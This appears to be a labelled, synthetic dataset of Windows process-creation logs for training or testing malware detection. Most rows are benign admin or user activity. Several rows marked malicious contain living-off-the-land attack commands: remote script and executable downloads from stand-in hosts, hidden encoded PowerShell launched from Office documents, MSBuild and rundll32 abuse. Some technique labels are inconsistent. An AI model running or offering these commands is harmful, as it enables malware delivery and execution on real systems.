UtcTime,ProcessGuid,ProcessId,Image,CommandLine,ParentImage,ParentCommandLine,ParentProcessId,User,IntegrityLevel,is_malicious,mitre_technique_id,technique_name,label
2024-07-04T12:29:54.309Z,{B38E253A-AD0F-4C8B-B379-890E855BF113},14055,C:\Windows\System32\notepad.exe,notepad.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",26211,CORP\netadmin,Medium,0,,,benign
2024-07-03T09:55:10.724Z,{B1FF7794-106A-4B19-92C0-03BC8A00969C},2625,C:\Windows\System32\schtasks.exe,"schtasks.exe /run /tn ""\Microsoft\Windows\Defrag\ScheduledDefrag""",C:\Windows\System32\cmd.exe,cmd.exe,38486,CORP\itops,High,0,,,gray_area
2024-07-05T13:13:41.511Z,{49C33AEC-E5A0-4DAC-8F17-5D1226256590},26928,C:\Windows\System32\calc.exe,calc.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",58978,CORP\pchen,Medium,0,,,benign
2024-07-05T21:20:40.735Z,{851ADC97-200E-48C4-883C-5885698ABC34},59159,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",50768,CORP\analyst01,Medium,0,,,benign
2024-07-05T03:21:19.330Z,{711C6849-5E5C-4A3A-A243-59C2CBCF4EF0},9942,C:\Windows\System32\UsoClient.exe,UsoClient.exe StartInteractiveScan,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,64954,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T09:10:57.156Z,{F4EF5E3C-54DB-4550-862D-35C01ABDEE7B},49416,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Import-Module ActiveDirectory; Get-ADComputer -Filter {OperatingSystem -like '*Server*'} -Properties OperatingSystem, LastLogonDate | Select Name, OperatingSystem, LastLogonDate | Export-Csv C:\Reports\servers.csv""",C:\Windows\System32\cmd.exe,cmd.exe,47045,CORP\sysadmin,High,0,,,gray_area
2024-07-03T10:07:19.502Z,{E4EE0A68-E84C-4346-A8EF-DEC88CB208ED},53500,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server3,C:\Windows\System32\cmd.exe,cmd.exe,29335,CORP\sysadmin,High,0,,,gray_area
2024-07-01T09:40:54.730Z,{68FF4EB2-3428-4425-BC52-E9000DB05ECE},29297,C:\Windows\System32\msiexec.exe,msiexec.exe /i http://deploy.corp.local/package4.msi /quiet /norestart,C:\Windows\System32\cmd.exe,cmd.exe,65191,CORP\sysadmin,High,0,,,gray_area
2024-07-01T14:34:01.005Z,{72F8F61F-D30E-437C-8FFE-D7E87BEBF67D},26882,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -NoProfile -ExecutionPolicy Bypass -File C:\Scripts\Backup-SharePointSites.ps1 -SiteUrl https://corp.sharepoint.com -OutputPath D:\Backups,C:\Windows\System32\cmd.exe,cmd.exe,8646,CORP\itops,High,0,,,gray_area
2024-07-03T17:32:35.584Z,{9FBDAA7F-3687-45C0-B187-0CF3A16D89D4},61681,C:\Windows\System32\fontdrvhost.exe,fontdrvhost.exe,C:\Windows\System32\smss.exe,smss.exe,38461,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-05T10:22:18.480Z,{355AFE12-B4F9-464C-AFBB-C0910274FDFB},36068,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",1545,CORP\jsmith,Low,0,,,benign
2024-07-05T12:49:41.348Z,{1ED2F857-6C25-4A8A-838A-6B096EE82894},8310,C:\Program Files\Zoom\bin\Zoom.exe,Zoom.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",20234,CORP\agarwal,Medium,0,,,benign
2024-07-05T11:14:42.603Z,{4235F7B2-8793-4A82-9DC5-957CBB200A2A},54376,C:\Windows\SoftwareDistribution\Download\Install\update.exe,update.exe /quiet /norestart,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,12491,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T12:49:06.915Z,{15256D95-2079-44EC-9AD9-0D9790C6129E},38611,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Set-ExecutionPolicy RemoteSigned -Scope CurrentUser""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,45179,CORP\sysadmin,High,0,,,benign
2024-07-03T09:13:10.406Z,{38E78BA2-8F98-49BB-83D1-2369B25EF489},7750,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --type=renderer --field-trial-handle=12345,C:\Program Files\Google\Chrome\Application\chrome.exe,"""C:\Program Files\Google\Chrome\Application\chrome.exe""",7262,CORP\klee,Low,0,,,benign
2024-07-05T03:18:05.781Z,{0D3FD874-8A08-4D4D-819F-5E910C2F2B06},11506,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,18877,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-04T20:31:41.324Z,{85E78E68-0633-4BC3-8C2A-6D50E927C9FC},12416,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,47345,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T22:04:22.430Z,{88C0E78F-7C79-46E7-9A65-3E30AF8DBA60},40460,C:\Windows\System32\wscript.exe,wscript.exe //e:jscript http://phish-host6775.cc/script898.js,C:\Windows\System32\cmd.exe,cmd.exe /c,48790,CORP\jsmith,Medium,1,T1059.005,WScript Remote Script,malicious
2024-07-04T20:14:08.521Z,{EBA6302E-E52D-4171-90AA-A7B8D8A35641},33343,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",6957,CORP\analyst02,Medium,0,,,benign
2024-07-01T12:36:38.109Z,{4C11B668-CD24-4571-A166-284FBC56BBBF},61847,C:\Windows\System32\cmd.exe,cmd.exe /c tasklist,C:\Windows\explorer.exe,C:\Windows\explorer.exe,65421,CORP\jsmith,Medium,0,,,benign
2024-07-05T15:09:20.883Z,{29454E2D-713C-421A-9891-7FDC6035B03A},47902,C:\Users\admin\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,12819,CORP\admin,High,0,,,benign
2024-07-04T17:30:49.249Z,{866A7E09-047C-427C-A4A5-93133366663B},50641,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",23260,CORP\helpdesk,Medium,0,,,benign
2024-07-05T14:37:07.356Z,{4F20D979-B2DC-4B33-B959-8CD67DD30339},24067,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Install-Module -Name Az -AllowClobber -Force""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,56411,CORP\itops,High,0,,,benign
2024-07-01T16:12:49.643Z,{C751BBD5-F0ED-4584-947A-D9EB64C46C3E},13009,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -ep bypass -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n document38.docm",51114,CORP\pchen,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-01T19:41:19.038Z,{EB0F560C-6689-4206-8ECD-1FFA038C87A4},48893,C:\Windows\System32\dwm.exe,dwm.exe,C:\Windows\System32\smss.exe,smss.exe,53975,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-01T09:40:50.856Z,{67D2F496-FF9B-48BD-88B8-FDCC41DE5331},31119,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,2067,CORP\mjones,Medium,0,,,benign
2024-07-01T20:34:24.189Z,{26AA1264-4697-47EF-A156-85430D5ABD79},25315,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,59031,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T13:40:16.770Z,{006F4CF9-C1EA-434F-8431-67858B52D5E7},47383,C:\Windows\System32\certutil.exe,certutil.exe -hashfile C:\Downloads\patch.msi MD5,C:\Windows\System32\cmd.exe,cmd.exe,30669,CORP\itops,High,0,,,gray_area
2024-07-01T10:19:06.592Z,{B227A015-A689-4A80-A50E-491674FDFA96},2682,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",61875,CORP\netadmin,Medium,0,,,benign
2024-07-05T04:22:50.078Z,{0248A4B5-72F3-47CA-8838-10CE97503B04},43699,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe C:\Users\Public\sys865.csproj,C:\Windows\System32\cmd.exe,cmd.exe,54984,CORP\mjones,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-02T22:45:59.717Z,{BDB79E88-C150-49DB-B764-8F3A870C56C5},42792,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\spoolsv.exe,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,12409,NT AUTHORITY\LOCAL SERVICE,System,0,,,benign
2024-07-03T12:08:24.792Z,{806C2730-9D55-4E22-9F69-34A4F8D8DAA5},54304,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,50358,CORP\admin,High,0,,,benign
2024-07-05T02:29:08.991Z,{0D085057-F189-44D8-AC33-E57798A8C907},47171,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -Command ""Get-VM | Where-Object {$_.State -eq 'Off'} | Start-VM""",C:\Windows\System32\cmd.exe,cmd.exe,34632,CORP\admin,High,0,,,gray_area
2024-07-05T10:14:29.653Z,{74BDB9C8-9FCE-41B3-B7F8-283F066F0F6B},17644,C:\Program Files\Microsoft\Teams\current\Teams.exe,Teams.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",31118,CORP\klee,Medium,0,,,benign
2024-07-01T09:24:35.406Z,{A0BB4ED1-26CF-4B42-9079-84C64A0391C8},37179,C:\Users\itops\Downloads\setup.exe,setup.exe /S /v/qn,C:\Windows\explorer.exe,C:\Windows\explorer.exe,22373,CORP\itops,High,0,,,benign
2024-07-05T10:59:18.448Z,{40B13759-41AA-408C-88DD-83261FEAE5F5},58727,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",46760,CORP\jsmith,Medium,0,,,benign
2024-07-05T17:57:14.499Z,{31D0DC6F-2E12-4348-B889-4CFEC5129CA8},15380,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",18887,CORP\analyst02,Medium,0,,,benign
2024-07-01T15:07:41.852Z,{969C4238-059F-4F6A-B1CA-30D4BC055EF5},11090,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",33661,CORP\analyst02,Medium,0,,,benign
2024-07-01T01:31:49.148Z,{B49AD7AE-C699-4E3A-8721-03A4326D42EC},63114,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -ep bypass -nop -w hidden -enc SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKABHAGUAdAAtAEMAbwBuAHQAZQBuAHQAIABDADoAXABVAHMAZQByAHMAXABQAHUAYgBsAGkAYwBcAHAAYQB5AGwAbwBhAGQALgBwAHMAMQApAA==,C:\Windows\System32\cmd.exe,WINWORD.EXE /n,31018,CORP\agarwal,Medium,1,T1059.001,PowerShell Encoded Command,malicious
2024-07-05T04:57:25.347Z,{234A5297-6166-4114-A4DF-B53FCBF892DF},36454,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe -File C:\Scripts\nightly-backup.ps1,C:\Windows\System32\cmd.exe,cmd.exe,4002,CORP\admin,High,0,,,gray_area
2024-07-05T09:51:55.549Z,{DEF9C614-BF8E-4416-843E-F77BA73E4DB9},13252,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-WmiObject Win32_OperatingSystem | Select Caption, Version""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,24972,CORP\itops,High,0,,,benign
2024-07-05T16:30:11.379Z,{BC58589A-3CD9-431D-A58C-18D5C38F977F},37640,C:\Windows\System32\odbcad32.exe,odbcad32.exe,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",37366,CORP\analyst02,Medium,0,,,benign
2024-07-05T01:49:13.141Z,{34E70036-19B1-42FE-B8EB-84A6348AF128},65307,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();new%20ActiveXObject(""WScript.Shell"").Run(""cmd /c svc393.exe"")",C:\Windows\System32\cmd.exe,cmd.exe,22949,CORP\mjones,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-04T13:04:32.663Z,{A61A9421-5F3F-4073-8366-151BDA92C4A5},23362,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",1829,CORP\jsmith,Medium,0,,,benign
2024-07-02T03:24:17.464Z,{0ABDCE8B-4DCD-45CB-BD0E-6F5A6A875B1B},42660,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",55664,CORP\pchen,Medium,0,,,benign
2024-07-04T08:51:05.843Z,{6228903F-0DA6-4435-B93E-2A48D2763387},10524,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\mjones\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",31911,CORP\mjones,Medium,0,,,benign
2024-07-05T13:52:46.404Z,{60FED1AB-F3A3-48FB-8F29-B54C47EB6467},33514,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\servicing\TrustedInstaller.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,2932,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-03T09:27:40.245Z,{6DBEDB44-4416-4648-8C6E-E197B039B1C0},34856,C:\Program Files\Mozilla Firefox\firefox.exe,firefox.exe -contentproc -childID 7,C:\Program Files\Mozilla Firefox\firefox.exe,"""C:\Program Files\Mozilla Firefox\firefox.exe""",51104,CORP\klee,Low,0,,,benign
2024-07-01T05:06:18.275Z,{9971B5D0-4A8C-4CB7-BBBA-70F5298EE3A9},9194,C:\Windows\System32\conhost.exe,conhost.exe 0xffffffff -ForceV1,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s Schedule,47871,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T04:21:05.487Z,{C7E08E3C-A17F-4700-8811-7B64C777F1AA},38449,C:\Windows\System32\winlogon.exe,winlogon.exe,C:\Windows\System32\smss.exe,smss.exe,49844,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T08:38:30.004Z,{4A9C1834-59DE-4975-8EDE-C76098061D6B},60077,C:\Windows\System32\wbem\WMIC.exe,wmic.exe process list full,C:\Windows\System32\cmd.exe,cmd.exe,1627,CORP\itops,High,0,,,gray_area
2024-07-02T16:15:26.503Z,{A2A7A742-36F7-4708-8C8E-9DC6284BB035},63992,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-NetTCPConnection | Where-Object {$_.State -eq 'Established'}""",C:\Windows\explorer.exe,C:\Windows\explorer.exe,4925,CORP\itops,High,0,,,benign
2024-07-03T03:46:00.049Z,{6694D3A3-94A7-4353-B678-20711AF4368B},26292,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs -p -s wuauserv,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k netsvcs,29719,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-04T13:59:55.123Z,{121D05F7-70F9-4172-8B28-248C679BD30C},58002,C:\Windows\System32\wininit.exe,wininit.exe,C:\Windows\System32\smss.exe,smss.exe,51488,NT AUTHORITY\SYSTEM,System,0,,,benign
2024-07-02T13:31:32.830Z,{2B22B55C-9CCF-4407-974D-39A365AFC669},51128,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe,C:\Windows\Microsoft.NET\Framework\v3.5\MSBuild.exe C:\Users\Public\patch587.csproj,C:\Windows\System32\cmd.exe,cmd.exe,44737,CORP\jsmith,Medium,1,T1127.001,MSBuild Inline Task,malicious
2024-07-01T15:12:38.204Z,{DF3646B2-A7E2-4A98-B8DA-71A1128D7F3B},51984,C:\Windows\System32\msiexec.exe,msiexec.exe /i C:\Installers\app_setup_2.4.14.msi /quiet,C:\Windows\explorer.exe,C:\Windows\explorer.exe,18235,CORP\itops,High,0,,,benign
2024-07-01T12:55:41.129Z,{7D9F65D2-A70D-4EC8-8F0E-30B07EEF5173},46968,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-Service | Where-Object {$_.Status -eq 'Running'}""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,57759,CORP\sysadmin,High,0,,,benign
2024-07-01T10:01:29.734Z,{31AC5707-1CEF-47EB-BDD9-32A9BB9437B3},22739,C:\Windows\System32\eventvwr.exe,eventvwr.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,3482,CORP\itops,High,0,,,benign
2024-07-05T14:05:49.633Z,{8126B929-55DF-4F1E-B640-3901AF03D910},20357,C:\Windows\System32\cmd.exe,cmd.exe /c arp -a,C:\Windows\explorer.exe,C:\Windows\explorer.exe,53301,CORP\mjones,Medium,0,,,benign
2024-07-04T09:51:46.480Z,{C0D817D7-20F6-44E0-9B41-835288FBB1E1},50914,C:\Windows\System32\cmd.exe,cmd.exe /c net view \\fileserver,C:\Windows\explorer.exe,C:\Windows\explorer.exe,56032,CORP\helpdesk,Medium,0,,,benign
2024-07-03T02:33:34.519Z,{5B0C7437-89AD-4B62-AEF0-C3F648425109},52538,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k LocalService -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,34267,NT AUTHORITY\NETWORK SERVICE,System,0,,,benign
2024-07-03T22:22:22.164Z,{7760E599-4652-4183-8A67-E1815329F658},57042,C:\Windows\System32\cmd.exe,cmd.exe /c powershell.exe -nop -w hidden -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtADsASQBFAFgAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABzACkAKQA=,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /n document12.docm",33809,CORP\agarwal,Medium,1,T1204.002,Office Macro Execution,malicious
2024-07-04T13:59:12.455Z,{6C36EC29-80BB-4B25-8A65-D96925350CE5},1613,C:\Windows\System32\wbem\WMIC.exe,wmic.exe process list full,C:\Windows\System32\cmd.exe,cmd.exe,15517,CORP\admin,High,0,,,gray_area
2024-07-06T03:55:51.237Z,{F12141FB-25A9-4217-94DB-16F9E451D977},55719,C:\Windows\System32\rundll32.exe,"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";eval(""window.close"")",C:\Windows\explorer.exe,explorer.exe,63091,CORP\klee,Medium,1,T1218.011,Rundll32 JavaScript,malicious
2024-07-01T12:42:55.501Z,{378BB4C8-B755-4A61-9EB8-B986332FD928},35584,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,"powershell.exe -NoProfile -Command ""Get-ADUser -Filter * -Properties LastLogonDate | Select Name, LastLogonDate""",C:\Windows\System32\cmd.exe,C:\Windows\System32\cmd.exe,64302,CORP\sysadmin,High,0,,,benign
2024-07-02T21:21:17.159Z,{59EA53FB-CEEF-47BC-9849-47C5F4A2561F},15110,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",63731,CORP\jsmith,Medium,0,,,benign
2024-07-04T09:02:32.349Z,{EC441B85-BD6F-4269-96A3-6D9A7A6762F5},64784,C:\Windows\System32\certutil.exe,certutil.exe -verifystore My server3,C:\Windows\System32\cmd.exe,cmd.exe,31377,CORP\itops,High,0,,,gray_area
2024-07-04T17:38:02.898Z,{ECEEEBCA-1CA2-47D3-825D-33616A638100},52371,C:\Program Files\Adobe\Acrobat DC\Acrobat\Acrobat.exe,Acrobat.exe C:\Users\mjones\Documents\report.pdf,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE""",35827,CORP\mjones,Medium,0,,,benign
2024-07-05T09:59:24.080Z,{CAA8B018-7BFF-480F-81DA-21C3814AB49E},37178,C:\Program Files\7-Zip\7zFM.exe,7zFM.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",20213,CORP\jsmith,Medium,0,,,benign
2024-07-03T19:23:11.309Z,{A0CEC71F-2D6C-47B6-9F2B-5C52A2BCE1F2},1927,C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE""",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",47400,CORP\agarwal,Medium,0,,,benign
2024-07-05T04:32:17.150Z,{8283D610-675B-4D08-A90B-9CD9ACF58DD0},51331,C:\Windows\System32\bitsadmin.exe,bitsadmin /transfer job9634 http://dropper-srv6968.ru/runtime784.exe C:\Users\Public\driver280.exe,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,cmd.exe,30794,CORP\mjones,Medium,1,T1197,BITSAdmin Download,malicious
2024-07-01T14:55:02.879Z,{E76EFE6F-2517-405B-82A7-84A9F3F6AD0B},31847,C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE,"""C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"" /n",C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",15577,CORP\pchen,Medium,0,,,benign
2024-07-03T14:58:50.967Z,{17527EE2-0874-4FD1-B91C-0144851E4D49},8430,C:\Windows\System32\mmc.exe,mmc.exe compmgmt.msc,C:\Windows\explorer.exe,C:\Windows\explorer.exe,26288,CORP\admin,High,0,,,benign
2024-07-02T12:45:28.780Z,{A0542A7D-88CB-4340-B550-77A2B82B2F21},34154,C:\Windows\System32\rundll32.exe,"rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl",C:\Windows\explorer.exe,C:\Windows\explorer.exe,33662,CORP\analyst01,Medium,0,,,gray_area
2024-07-05T19:52:18.744Z,{FBED7CB6-80FE-48DB-A8B3-903E3404DF11},45380,C:\Windows\System32\certutil.exe,certutil.exe -encode C:\Users\Public\decoded4817.exe C:\Users\Public\encoded4461.txt,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,powershell.exe,13410,CORP\klee,Medium,1,T1140,Certutil Base64 Decode,malicious
2024-07-04T17:23:39.282Z,{C8BCF743-3C14-4A6B-9FBC-0A3938F9601B},45604,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe https://sharepoint.corp.local/sites/team,C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",27047,CORP\dbadmin,Medium,0,,,benign
2024-07-02T18:40:52.475Z,{7728D061-8A80-41CD-B019-91ACBA75EB94},60597,C:\Program Files\Slack\Slack.exe,Slack.exe,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",46945,CORP\analyst01,Medium,0,,,benign
2024-07-02T10:38:51.008Z,{E7956AE1-9F83-42F5-B5CA-A11BBB998818},15664,C:\Users\itops\Downloads\installer.exe,installer.exe --silent --accept-license,C:\Windows\explorer.exe,C:\Windows\explorer.exe,17540,CORP\itops,High,0,,,benign
2024-07-02T17:36:42.893Z,{CBEF27A4-29EE-474A-AF26-E9A9B1FE1543},64421,C:\Windows\System32\resmon.exe,resmon.exe,C:\Windows\explorer.exe,C:\Windows\explorer.exe,10581,CORP\admin,High,0,,,benign
2024-07-03T15:04:43.239Z,{6652ABBD-9221-426F-AAE6-8E66A89551CA},61549,C:\Program Files\Google\Chrome\Application\chrome.exe,chrome.exe --no-first-run,C:\Windows\explorer.exe,"C:\Windows\explorer.exe /factory,{GUID}",18337,CORP\klee,Medium,0,,,benign
2024-07-04T08:00:34.564Z,{406650B9-5FBB-42E6-AF66-08FAD8DC7DDE},27957,C:\Windows\System32\cmd.exe,cmd.exe /c robocopy C:\Data D:\Backup /mir,C:\Windows\explorer.exe,C:\Windows\explorer.exe,1776,CORP\helpdesk,Medium,0,,,benign
2024-07-02T02:28:11.920Z,{5B6EEFA0-E904-4938-AA46-42AD49339EEE},47751,C:\Windows\System32\svchost.exe,C:\Windows\System32\svchost.exe -k DcomLaunch -p,C:\Windows\System32\services.exe,C:\Windows\System32\services.exe,30170,NT AUTHORITY\SYSTEM,System,0,,,benign
